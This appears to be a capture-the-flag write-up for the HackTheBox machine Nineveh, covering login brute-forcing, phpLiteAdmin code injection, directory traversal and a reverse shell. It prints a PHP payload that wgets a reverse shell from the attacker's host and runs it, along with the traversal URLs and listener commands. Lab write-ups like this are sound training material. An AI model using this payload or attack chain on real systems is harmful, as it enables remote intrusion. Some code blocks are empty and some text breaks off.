URL /department/login.php provides us a login page asking for a username and password.

Testing out few usernames it seems the error message reveals if an existing username was given by providering error message "Invalid Password!". Username 'admin' seems to exist.

Also, the source code of the page contains

```
<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->
```

We need to scan also the https separately

## Initial Access

### Bruteforce admin credentials

As we know the username to the login page, bruteforce the password. Better to use hydra as Burpsuite is painfully slow when using a community edition.

```

```

With the username and password we can login and are greeted with an under construction -page. However, we can see a notes page. The URL is /department/manage.php?notes=files/ninevehNotes.txt and the contents

```
Have you fixed the login page yet! hardcoded username and password is really bad idea!

check your serect folder to get in! figure it out! this is your challenge

Improve the db interface.
~amrois
```

So, it seems we are tasked to find our secret folder and the contents of it.

On the https site the same

```

### phpLiteAdmin code injection

Login to the admin portal. Create a table called ninevehnotes.txt.php that gets created in directory /var/tmp/ninevehnotes.txt.php (remember to switch to the new table from the menu).

Create one table with a one field, type TEXT and the default value the payload. We use php reverse shell so use the kali standard, just fix the ip address.

```
$ cp /usr/share/laudanum/php/php-reverse-shell.php .                                            
                                                                                                                                                
тФМтФАтФА(kaliуЙ┐kali)-[~/Documents/CTF/hackthebox/Nineveh]
тФФтФА$ vi php-reverse-shell.php 
                                                                                                                                                
тФМтФАтФА(kaliуЙ┐kali)-[~/Documents/CTF/hackthebox/Nineveh]
тФФтФА$ python -m http.server 9000

```

Create a table with one field, and the default value of our field fetches our reverse shell and executes it

For this CTF it is mandatory the database table contains name ninevehNotes.txt. This seems to be something the manage.php script checks. We can get past that check by naming our database to ninevehNotes.txt.php. The name of the database table and field do not matter.

```
<?php system("wget 10.10.14.23:9000/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php"); ?>
```

Finally insert the default value we defined for the field to the table.


### Directory traversal

The url of the notes seems to be vulnerable for directory traversal. This can be proven as all the following urls show the contents of the notes

```
http://10.129.180.10/department/manage.php?notes=../department/files/ninevehNotes.txt
http://10.129.180.10/department/manage.php?notes=../../html/department/files/ninevehNotes.txt
http://10.129.180.10/department/manage.php?notes=../../../www/html/department/files/ninevehNotes.txt
```

From this we can deduct the full directory path is as follow, but instead of showing the notes we get an error message 'file name too long'. However, we should be able to use this to plan our next moves.

```
http://10.129.180.10/department/manage.php?notes=../../../../var/www/html/department/files/ninevehNotes.txt
```

Using this information we can call the php-exploit

```
http://10.129.180.10/department/manage.php?notes=/var/tmp/ninevehNotes.txt.php
```

and we get a shell.

```
 nc -nvlp 8888
listening on [any] 8888 ...

/bin/sh: 0: can't access tty; job control turned off
$ whoami

```

Ctrl-z, stty raw -echo, fg, reset to get a fully functional shell.
